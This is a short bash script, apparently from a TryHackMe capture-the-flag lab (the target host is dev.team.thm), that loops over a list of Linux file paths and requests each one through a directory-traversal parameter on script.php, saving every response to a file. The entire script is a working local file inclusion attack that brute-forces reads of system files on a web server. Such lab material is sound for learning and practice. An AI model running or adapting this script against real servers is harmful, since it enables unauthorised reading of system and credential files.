#!/bin/bash
filename='linux-paths.txt'

while read line  
do 
echo "[+] Trying $line"
curl http://dev.team.thm/script.php\?page\=../../../../../../../../$line > result.txt

done < $filename
